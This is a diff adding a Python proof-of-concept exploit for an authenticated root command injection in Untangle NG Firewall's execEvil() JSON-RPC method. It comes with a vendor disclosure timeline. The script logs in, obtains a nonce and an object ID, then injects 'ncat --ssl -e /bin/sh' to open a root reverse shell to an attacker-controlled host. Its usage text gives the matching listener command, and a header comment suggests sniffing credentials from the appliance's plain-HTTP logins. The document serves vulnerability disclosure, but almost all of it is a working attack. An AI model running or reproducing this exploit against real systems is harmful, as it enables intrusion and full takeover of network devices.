@@ -1,0 +1,75 @@
+#!/usr/bin/python
+
+# Title:       Untangle NGFW <= v12.1.0 beta execEvil() authenticated root CI exploit
+# CVE:        (Not yet assigned)
+# Discovery:      Matt Bush (@3xocyte)
+# Exploit:      Matt Bush
+# Contact:      mbush@themissinglink.com.au
+
+# Disclosure Timeline:
+# 22/4/2016      Attempted to contact vendor after discovery of vulnerabilities
+# 6/5/2016      No response from vendor, vulnerabilities reported to US-CERT (assigned VU#538103)
+# 12/5/2016      US-CERT confirms contacting vendor
+# 16/6/2016      US-CERT notifies of no response from vendor and suggests requesting CVE-ID following their timeline
+# 27/6/2016       Public disclosure
+
+# A command injection vulnerability exists in Untangle NG Firewall, which allows non-root authenticated users to execute system commands with
+# root privileges. This exploit has been tested on Untangle NG Firewall versions 11.2, 12, 12.0.1, and 12.1.0 beta, but should work on previous 
+# versions. The client-side sanitisation issues identified in the disclosure post can be exploited with a web app proxy. This exploit leverages
+# the vulnerable function directly. Credentials can be obtained by sniffing unsecured HTTP logins (which the appliance defaults to).
+
+# The author is not responsible for how this script or any information within this script is used. Don't do anything stupid.
+
+import json, requests, sys
+
+if len(sys.argv) < 5:
+  print "[!] usage: " + sys.argv[0] + " <RHOST> <LHOST> <username> <password>"
+  print "[!] and in a separate terminal: 'ncat --ssl -nlvp 443'"
+  sys.exit()
+
+print "\nUntangle NGFW <= v12.0.1 execEvil() authenticated root CI exploit"
+print "                          by @3xocyte\n"
+
+rhost = sys.argv[1]
+lhost = sys.argv[2]
+username = sys.argv[3]
+password = sys.argv[4]
+
+login_url = "http://" + rhost + "/auth/login?url=/webui&realm=Administrator"
+rpc_url = "http://" + rhost + "/webui/JSON-RPC"
+auth = {'username': username, 'password': password}
+
+print "[*] Opening session..."
+session = requests.Session()
+
+print "[*] Authenticating..."
+try:
+  login = session.post(login_url, data=auth)
+  get_nonce = {"id":1,"nonce":"","method":"system.getNonce","params":[]}
+  req_nonce = session.post(rpc_url, data=json.dumps(get_nonce))
+  data = json.loads(req_nonce.text)
+  nonce = data['result']
+except:
+  print "[!] Authentication failed. Quitting."
+  sys.exit()
+
+print "[*] Getting execManager objectID..."
+try:
+  get_obj_id = {"id":2,"nonce":nonce,"method":"UvmContext.getWebuiStartupInfo","params":[]}
+  req_obj_id = session.post(rpc_url, data=json.dumps(get_obj_id))
+  data = json.loads(req_obj_id.text)
+  object_id = data['result']['execManager']['objectID']
+
+except:
+  print "[!] Could not get execManager objectID. Quitting."
+  sys.exit()
+
+print "[*] Exploiting Ung.Main.getExecManager().execEvil()..."
+try:
+  exploit = {"id":3,"nonce":nonce,"method":".obj#" + str(object_id) + ".execEvil","params":["ncat --ssl -e /bin/sh " + lhost + " 443"]}
+  session.post(rpc_url, data=json.dumps(exploit))
+except:
+  print "[!] Exploit failed. Quitting."
+  sys.exit()
+
+print "[*] Exploit sent!"
